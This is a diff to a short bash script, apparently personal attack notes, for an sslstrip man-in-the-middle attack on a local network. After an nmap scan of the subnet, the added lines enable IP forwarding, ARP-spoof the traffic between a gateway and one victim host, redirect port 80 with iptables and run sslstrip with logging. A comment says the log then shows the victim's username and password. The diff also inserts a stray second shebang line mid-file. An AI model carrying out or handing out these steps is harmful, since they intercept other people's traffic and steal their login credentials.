@@ -1,9 +1,6 @@
 #!/bin/bash
 
-#----------------------------------------------------------------------------------------#
-#	sslstrip  #
-#----------------------------------------------------------------------------------------#	
-
+#!/bin/bash
 
 # nmap scan the network
 nmap -Pn -sC -O 192.168.1.1/24
@@ -48,7 +45,16 @@ more sslstrip.log
 
 # the log will then show you the username and password
 
+# sslstrip set up
 
+# set ipforwarding
+echo '1' > /proc/sys/net/ipv4/ip_forward
 
+# run arpspoof
+arpspoof -i wlan0 192.168.1.1 192.168.1.8
 
+# set up iptables
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 
+# run sslstrip
+sslstrip -k -l 8080
